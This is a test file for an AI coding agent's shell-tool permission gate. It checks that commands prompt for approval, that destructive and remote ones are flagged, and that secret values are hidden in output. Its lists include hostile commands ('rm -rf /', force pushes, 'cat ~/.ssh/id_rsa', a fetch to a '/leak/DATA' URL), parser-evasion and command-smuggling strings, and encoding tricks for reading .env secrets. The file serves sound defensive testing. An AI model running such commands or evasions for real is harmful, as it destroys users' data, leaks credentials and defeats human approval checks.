// What the shell tool does with real commands in a real git repository, once it is running inside an agent session.
import { describe, expect } from "bun:test"
import { LayerNode } from "@opencode-ai/core/effect/layer-node"
import { Cause, Effect, Exit, Layer } from "effect"
import { existsSync, mkdirSync, readFileSync, symlinkSync, writeFileSync } from "node:fs"
import fs from "node:fs"
import path from "path"
import { Global } from "@opencode-ai/core/global"
import { Config } from "@/config/config"
import { ShellTool } from "../../src/tool/shell"
import { provideInstance, testInstanceStoreLayer, tmpdirScoped } from "../fixture/fixture"
import { Agent } from "../../src/agent/agent"
import { Truncate } from "@/tool/truncate"
import { SessionID, MessageID } from "../../src/session/schema"
import { CrossSpawnSpawner } from "@opencode-ai/core/cross-spawn-spawner"
import { FSUtil } from "@opencode-ai/core/fs-util"
import { Plugin } from "../../src/plugin"
import { testEffect } from "../lib/effect"
import { RuntimeFlags } from "@/effect/runtime-flags"
import { spawnSync } from "node:child_process"

const it = testEffect(
  Layer.mergeAll(
    LayerNode.compile(
      LayerNode.group([CrossSpawnSpawner.node, FSUtil.node, Plugin.node, Truncate.node, Config.node, Agent.node, RuntimeFlags.node]),
    ),
    testInstanceStoreLayer,
  ),
)

const seed = (dir: string) => {
  const git = (...args: string[]) => spawnSync("git", ["-c", "user.name=t", "-c", "user.email=t@t", ...args], { cwd: dir })
  git("init", "-q")
  mkdirSync(path.join(dir, "src"), { recursive: true })
  mkdirSync(path.join(dir, "data"), { recursive: true })
  mkdirSync(path.join(dir, "dist"), { recursive: true })
  writeFileSync(path.join(dir, ".gitignore"), "data/\ndist/\n.env\nhuge.bin\n")
  writeFileSync(path.join(dir, "src/a.ts"), "a\n")
  writeFileSync(path.join(dir, "data/local.db"), "only copy\n")
  writeFileSync(path.join(dir, "dist/out.js"), "built\n")
  writeFileSync(path.join(dir, ".env"), "API_KEY=x\n")
  writeFileSync(path.join(dir, "big.bin"), Buffer.alloc(3 * 1024 * 1024))
  git("add", "src", ".gitignore")
  git("commit", "-qm", "init")
}

const outcome = (command: string, canUndo = true, prepare?: (dir: string) => void) =>
  Effect.gen(function* () {
    const dir = yield* tmpdirScoped()
    seed(dir)
    prepare?.(dir)
    const asked: { patterns: readonly string[]; always: readonly string[]; risk?: unknown; noAlways?: boolean }[] = []
    const stop = new Error("stopped at prompt")
    const ctx = {
      sessionID: SessionID.make("ses_trust"),
      messageID: MessageID.make("msg_trust"),
      callID: "",
      agent: "build",
      abort: AbortSignal.any([]),
      messages: [],
      metadata: () => Effect.void,
      trust: { canUndo },
      ask: (req: { patterns: readonly string[]; always: readonly string[]; metadata: Record<string, unknown>; harmless?: boolean; noAlways?: boolean }) => {
        // No shell text can ever skip the baseline's ask.
        expect(req.harmless).toBeUndefined()
        asked.push({ patterns: req.patterns, always: req.always, risk: req.metadata.risk, noAlways: req.noAlways })
        return Effect.die(stop)
      },
    }
    const exit = yield* Effect.gen(function* () {
      const tool = yield* (yield* ShellTool).init()
      return yield* tool.execute({ command }, ctx as never)
    }).pipe(provideInstance(dir), Effect.exit)
    if (Exit.isFailure(exit) && Cause.squash(exit.cause) !== stop) throw Cause.squash(exit.cause)
    return asked[0]
  })

// For the redirect evasions: it must stop at the prompt, and what it would have written must not exist.
const stoppedBefore = (command: string, prepare: (dir: string) => void, written: (dir: string) => boolean) =>
  Effect.gen(function* () {
    const dir = yield* tmpdirScoped()
    seed(dir)
    prepare(dir)
    const asked: unknown[] = []
    const stop = new Error("stopped at prompt")
    const ctx = {
      sessionID: SessionID.make("ses_trust"),
      messageID: MessageID.make("msg_trust"),
      callID: "",
      agent: "build",
      abort: AbortSignal.any([]),
      messages: [],
      metadata: () => Effect.void,
      trust: { canUndo: true },
      ask: (req: { harmless?: boolean }) => {
        if (req.harmless) return Effect.void
        asked.push(req)
        return Effect.die(stop)
      },
    }
    const exit = yield* Effect.gen(function* () {
      const tool = yield* (yield* ShellTool).init()
      return yield* tool.execute({ command }, ctx as never)
    }).pipe(provideInstance(dir), Effect.exit)
    if (Exit.isFailure(exit) && Cause.squash(exit.cause) !== stop) throw Cause.squash(exit.cause)
    expect(asked.length).toBeGreaterThan(0)
    expect(written(dir)).toBe(false)
  })

const run = (command: string, prepare?: (dir: string) => void) =>
  Effect.gen(function* () {
    const dir = yield* tmpdirScoped()
    seed(dir)
    prepare?.(dir)
    const ctx = {
      sessionID: SessionID.make("ses_trust"),
      messageID: MessageID.make("msg_trust"),
      callID: "",
      agent: "build",
      abort: AbortSignal.any([]),
      messages: [],
      metadata: () => Effect.void,
      trust: { canUndo: true },
      ask: () => Effect.void,
    }
    return yield* Effect.gen(function* () {
      const tool = yield* (yield* ShellTool).init()
      return yield* tool.execute({ command }, ctx as never)
    }).pipe(provideInstance(dir))
  })

describe("shell commands inside an agent session", () => {
  // Each of these once ran unprompted because of how its text parsed. Three gate passes found a way past that parser, some of
  // them below, so no text skips a prompt now, and the read, glob, grep and git tools are how an agent reads without one.
  const everyText = [
    "ls src",
    "ls -la",
    "cat src/a.ts",
    "head -n 5 src/a.ts",
    "grep -rn a src",
    "find src -name 'a*' -type f",
    "ls | grep a",
    "cat src/a.ts | sort | uniq -c",
    "echo hi 2>/dev/null",
    "pwd",
    "true",
    "test -f src/a.ts",
    "ls src && cat src/a.ts",
    "cd src",
    "# only a comment",
    "ls \\\r\nrm data/local.db",
    "ls \\\r\ngit push origin main",
    "echo a\f#; touch rce",
    "echo a\v#; touch rce",
    "echo a\r#; touch rce",
    "echo a\f#$(touch rce)",
    "sort -r\\\no swarm.json evil.txt",
    "cat src/.\\\n./.\\\n./x",
    "cat .e\\\nnv",
    "grep -c '^API_KEY=abcd' .e\\\nnv",
  ]
  for (const command of everyText) {
    it.live(`asks, however it parses: ${JSON.stringify(command)}`, () =>
      outcome(command).pipe(Effect.map((asked) => expect(asked).toBeDefined())),
    )
  }

  // Each of these used to run unprompted on the strength of Undo, or of a check of today's git config.
  const asksNow = [
    "git status",
    "git status --short",
    "git diff",
    "git log --oneline -5",
    "git show HEAD",
    "git branch",
    "git --version",
    "git add -A && git commit -qm x --allow-empty",
    "git reset --hard",
    "rm -rf src",
    "rm -rf dist",
    "mv src/a.ts src/b.ts",
    "cp src/a.ts src/b.ts",
    "mkdir -p src/lib && touch src/lib/x.ts",
    "echo hi > src/out.txt",
    "ls | sort > src/list.txt",
    "cat < src/a.ts",
  ]
  for (const command of asksNow) {
    it.live(`asks: ${command}`, () => outcome(command).pipe(Effect.map((asked) => expect(asked).toBeDefined())))
  }

    it.live("a rule for the command that follows does not cover what came before it", () =>
      outcome("export PATH=evil; ls src").pipe(
        Effect.map((asked) => expect(asked?.patterns).toContain("export PATH=evil; ls src")),
      ),
    )

    it.live("a sequence lists every part, so allowing it is allowing all of it", () =>
      outcome("ls src ; bun test").pipe(
        Effect.map((asked) => {
          expect(asked?.patterns).toContain("ls src")
          expect(asked?.patterns).toContain("bun test")
        }),
      ),
    )

  describe('"Allow always" is one plain command, for its program plus subcommand', () => {
    const offered: [string, string][] = [
      ["git status --short", "git status *"],
      ["git log --oneline -5", "git log *"],
      ["ls src", "ls *"],
      ["bun test", "bun test *"],
      ["make test", "make test *"],
      ["npm run build", "npm run build *"],
      ["make", "make"],
      ["git", "git"],
    ]
    for (const [command, rule] of offered) {
      it.live(`offers ${rule} for ${command}`, () =>
        outcome(command).pipe(
          Effect.map((asked) => {
            expect(asked?.always).toEqual([rule])
            expect(asked?.noAlways).toBe(false)
          }),
        ),
      )
    }
    const none = [
      // Chains and redirects, whatever else they are.
      "ls && git status",
      "ls src ; bun test",
      "ls | sort",
      "echo x > a.txt",
      "echo hi > src/out.txt",
      "cat README.md > b.txt",
      "bun test 2>&1",
      "bun test | tail -5",
      "ls \\\r\nrm data/local.db",
      "echo a\f#; touch rce",
      "cat .e\\\nnv",
      "FOO=1 ls",
      "./run.sh",
      "/bin/ls",
      "'ls' src",
      "ls  src",
      // A subcommand that cannot be named.
      "git -c core.pager=evil status",
      "git -C . status",
      // What it names is not in plain view of an "always".
      "cat .env",
      "cat .git/config",
      "git diff --output=/tmp/x",
      "head /etc/hosts",
      "head ../x",
      "git add .env",
      // A rule for these would be a rule for anything.
      "node x.js",
      "python3 x.py",
      "sh x.sh",
      "npx evil",
      "curl http://x",
      "rm a",
      "mv a b",
      "sed -i s/a/b/ a",
      "find . -delete",
      "git config core.fsmonitor evil",
      // Labelled.
      "git push origin main",
      "git commit --amend",
    ]
    for (const command of none) {
      it.live(`offers none, and no earlier always answers it: ${JSON.stringify(command)}`, () =>
        outcome(command).pipe(
          Effect.map((asked) => {
            expect(asked?.always).toEqual([])
            expect(asked?.noAlways).toBe(true)
          }),
        ),
      )
    }
  })

  const lost = [
    "rm data/local.db",
    "rm -rf data",
    "rm .env",
    "rm big.bin",
    "rm -rf .",
    "rm -rf .git",
    "rm -rf ../elsewhere",
    "rm -rf /",
    "echo x > data/local.db",
    "mv src/a.ts .env",
    "git push --force origin main",
    "git reset --hard HEAD~1",
    "ls; git push -f",
    "cd src && git push --force",
    "git -C . push --force",
    "git reset --har HEAD~1",
    "git reset src/a.ts",
    "git reset feat/old",
    "git reset v1.0",
    "git commit --am -m x",
    "git commit --amend -m x",
    "git branch -qD victim",
    "git branch -C main victim",
    "git switch --force-c main HEAD~1",
    "/usr/bin/dropdb orders",
  ]
  for (const command of lost) {
    it.live(`asks, and says Undo cannot help: ${command}`, () =>
      outcome(command).pipe(
        Effect.map((asked) => {
          expect(asked?.risk).toBe("irreversible")
          // "Allow always" would approve the next, different, one.
          expect(asked?.always).toEqual([])
        }),
      ),
    )
  }

  it.live("says a plain push leaves the machine", () =>
    outcome("git push origin main").pipe(Effect.map((asked) => expect(asked?.risk).toBe("remote"))),
  )

  const unsure = [
    "PATH=/tmp ls",
    "FOO=1 ls",
    "ls() { rm -rf /; }; ls",
    "cd .. && ls",
    "cd .. && rm -rf x",
    "echo x > .git/hooks/pre-commit",
    "touch swarm.json",
    "echo x > ~/out",
    "echo x > $TARGET",
    "cat ~/.ssh/id_rsa",
    "bash -c 'rm -rf src'",
    "git add . && bun test",
    "rm $(cat list)",
  ]
  for (const command of unsure) {
    it.live(`keeps its normal prompt: ${command}`, () =>
      outcome(command).pipe(
        Effect.map((asked) => {
          expect(asked).toBeDefined()
          expect(asked?.risk).toBeUndefined()
        }),
      ),
    )
  }

  describe("a redirect the parser does not attach to one command", () => {
    const evasions = [
      "{ echo PWNED; } > ../out.txt",
      "(echo PWNED) > ../out.txt",
      "if true; then echo PWNED; fi > ../out.txt",
      "for i in 1; do echo PWNED; done > ../out.txt",
      "while false; do :; done > ../out.txt",
      "echo x | cat > ../out.txt",
      "{ echo gone; } > data/local.db",
      "{ echo x; } >> .git/config",
      "echo x | cat >> .git/config",
      "> .git/config",
      "> ../out.txt echo x",
      "echo x > ../out.txt extra",
      "echo x >> .gi?/config",
      "echo x >> .gi\\t/config",
      'echo x >> ".g"it/config',
      "echo x >> {.git,x}/config",
      "cat <<EOF > ../out.txt\nx\nEOF",
    ]
    for (const command of evasions) {
      it.live(`stops at the prompt: ${command.replaceAll("\n", " ")}`, () =>
        outcome(command).pipe(Effect.map((asked) => expect(asked).toBeDefined())),
      )
    }

    it.live("a group's redirect outside the project never lands", () =>
      stoppedBefore("{ echo PWNED; } > escaped.txt", () => {}, (dir) => existsSync(path.join(dir, "escaped.txt"))),
    )

  })

  describe("anything that can read or send data off the machine, or run a configured program", () => {
    for (const command of [
      "git fetch",
      "git fetch origin",
      "git fetch http://127.0.0.1:47203/leak/DATA",
      "git fetch . +HEAD~1:refs/heads/other",
      "git commit --allow-empty -F /etc/hosts",
    ]) {
      it.live(`asks: ${command}`, () => outcome(command).pipe(Effect.map((asked) => expect(asked).toBeDefined())))
    }

    it.live("a URL is called out as leaving the machine, and offers no always", () =>
      outcome("git fetch http://127.0.0.1:47203/leak/DATA").pipe(
        Effect.map((asked) => {
          expect(asked?.risk).toBe("remote")
          expect(asked?.always).toEqual([])
        }),
      ),
    )

  })

  describe("moving history is not what a snapshot restores", () => {
    for (const command of ["git reset --soft HEAD~1", "git reset --keep HEAD~1", "git reset HEAD~1", "git checkout -B main HEAD~1", "git switch -C main HEAD~1"]) {
      it.live(`asks, and says Undo cannot help: ${command}`, () =>
        outcome(command).pipe(Effect.map((asked) => expect(asked?.risk).toBe("irreversible"))),
      )
    }
    for (const command of ["git reset", "git reset HEAD", "git reset -- src/a.ts"]) {
      it.live(`only unstaging asks without that warning: ${command}`, () =>
        outcome(command).pipe(
          Effect.map((asked) => {
            expect(asked).toBeDefined()
            expect(asked?.risk).toBeUndefined()
          }),
        ),
      )
    }
  })

  describe("git commands that write paths ask, and nothing reaches the path first", () => {
    const branchWithConfig = (dir: string) => {
      const git = (...args: string[]) => spawnSync("git", ["-c", "user.name=t", "-c", "user.email=t@t", ...args], { cwd: dir })
      git("checkout", "-q", "-b", "b")
      writeFileSync(path.join(dir, "swarm.json"), '{"permission":{"*":"allow"}}\n')
      git("add", "swarm.json")
      git("commit", "-qm", "c")
      git("checkout", "-q", "-")
    }
    for (const command of [
      "git mv src/a.ts swarm.json",
      "git mv src .swarm",
      "git mv src .github/workflows",
      "git mv src .husky",
      "git restore --source=b swarm.json",
      "git checkout b -- swarm.json",
      "git checkout b",
      "git rm -f swarm.json",
      "git clean -f",
      "git stash",
      "git stash push -a",
    ]) {
      it.live(`asks: ${command}`, () =>
        stoppedBefore(command, branchWithConfig, (dir) => existsSync(path.join(dir, "swarm.json"))),
      )
    }
  })

  describe("a nested repository holds history no snapshot has", () => {
    const nested = (dir: string) => {
      mkdirSync(path.join(dir, "vendor/nested"), { recursive: true })
      spawnSync("git", ["init", "-q"], { cwd: path.join(dir, "vendor/nested") })
      writeFileSync(path.join(dir, "vendor/nested/only.txt"), "x\n")
      spawnSync("git", ["-c", "user.name=t", "-c", "user.email=t@t", "add", "."], { cwd: path.join(dir, "vendor/nested") })
      spawnSync("git", ["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "x"], { cwd: path.join(dir, "vendor/nested") })
    }
    for (const command of ["rm -rf vendor/nested", "git clean -ffd"]) {
      it.live(`asks, and says Undo cannot help: ${command}`, () =>
        outcome(command, true, nested).pipe(Effect.map((asked) => expect(asked?.risk).toBe("irreversible"))),
      )
    }
    it.live("cleaning without one asks like any other, and does not say Undo cannot help", () =>
      outcome("git clean -fd", true, (dir) => {
        spawnSync("rm", [path.join(dir, "big.bin")])
      }).pipe(
        Effect.map((asked) => {
          expect(asked).toBeDefined()
          expect(asked?.risk).toBeUndefined()
        }),
      ),
    )
  })

  it.live("a finished command leaves no record behind to be ended later", () =>
    Effect.gen(function* () {
      const result = yield* run("echo done")
      expect(result.output).toContain("done")
      expect(result.metadata.exit).toBe(0)
      const left = fs.readdirSync(path.join(Global.Path.state, "shell-running", "ses_trust"))
      expect(left).toEqual([])
    }),
  )

  describe("what a command prints from a secret file", () => {
    const secrets = (dir: string) => {
      writeFileSync(path.join(dir, ".env"), "API_KEY=abcSECRETvalue123456\n")
      writeFileSync(path.join(dir, "credentials"), "[default]\naws_secret_access_key = plainSecretInCredentialsFile\n")
      writeFileSync(path.join(dir, ".netrc"), "machine x login me password netrcSecretValue\n")
      mkdirSync(path.join(dir, "config"), { recursive: true })
      writeFileSync(path.join(dir, "config/secrets.yaml"), "db_password: yamlSecretValue9\n")
      mkdirSync(path.join(dir, "a/b/c"), { recursive: true })
      writeFileSync(path.join(dir, "a/b/c/.env"), "DEEP_TOKEN=deepSecretValueInLevel3\n")
    }
    const hidden: [string, string][] = [
      ["cat .env", "abcSECRETvalue123456"],
      ["cat credentials", "plainSecretInCredentialsFile"],
      ["cat .netrc", "netrcSecretValue"],
      ["cat config/secrets.yaml", "yamlSecretValue9"],
      ["cat a/b/c/.env", "deepSecretValueInLevel3"],
    ]
    for (const [command, value] of hidden) {
      it.live(`hides the value: ${command}`, () =>
        run(command, secrets).pipe(
          Effect.map((result) => {
            expect(result.output).not.toContain(value)
            expect(result.output).toContain("[hidden:")
          }),
        ),
      )
    }
    const reshaping = [
      "grep -o . .env",
      "cut -c9-14 .env",
      "jq -Rrs @base64 .env",
      "cat .env | base64",
      "cat .env | cut -c9-14",
      "cut -c9-14 < .env",
      "head -c 12 .env",
      "python3 -c \"print(open('.env').read()[::-1])\"",
    ]
    for (const command of reshaping) {
      it.live(`withholds what it cannot recognise: ${command}`, () =>
        run(command, secrets).pipe(
          Effect.map((result) => {
            expect(result.output).toContain("output withheld")
            expect(result.output).not.toContain("SECRET")
            expect(result.metadata.output).not.toContain("SECRET")
            expect(result.output).not.toContain("=")
          }),
        ),
      )
    }
    it.live("what is shown and stored while a command runs is hidden too", () =>
      Effect.gen(function* () {
        const dir = yield* tmpdirScoped()
        seed(dir)
        secrets(dir)
        const live: string[] = []
        const ctx = {
          sessionID: SessionID.make("ses_trust"),
          messageID: MessageID.make("msg_trust"),
          callID: "",
          agent: "build",
          abort: AbortSignal.any([]),
          messages: [],
          metadata: (input: { metadata?: { output?: string } }) =>
            Effect.sync(() => {
              live.push(input.metadata?.output ?? "")
            }),
          trust: { canUndo: true },
          ask: () => Effect.void,
        }
        yield* Effect.gen(function* () {
          const tool = yield* (yield* ShellTool).init()
          return yield* tool.execute({ command: "cat .env" }, ctx as never)
        }).pipe(provideInstance(dir))
        expect(live.join("\n")).toContain("[hidden:API_KEY]")
        expect(live.join("\n")).not.toContain("abcSECRETvalue123456")
      }),
    )

    it.live("an ordinary reshape of an ordinary file is left alone", () =>
      run("cut -c1-1 src/a.ts").pipe(Effect.map((result) => expect(result.output).toContain("a"))),
    )
  })

  describe("the prompted way to read one still hides what it can", () => {
    const secrets = (dir: string) => writeFileSync(path.join(dir, ".env"), "API_KEY=abcSECRETvalue123456\n")
    it.live("hides the value once allowed", () =>
      run("cat .env", secrets).pipe(
        Effect.map((result) => {
          expect(result.output).not.toContain("abcSECRETvalue123456")
          expect(result.output).toContain("[hidden:")
        }),
      ),
    )
  })

  it.live("without snapshots nothing changes", () =>
    Effect.gen(function* () {
      expect(yield* outcome("rm -rf src", false)).toBeDefined()
      expect(yield* outcome("touch x", false)).toBeDefined()
      expect(yield* outcome("ls src", false)).toBeDefined()
    }),
  )
})
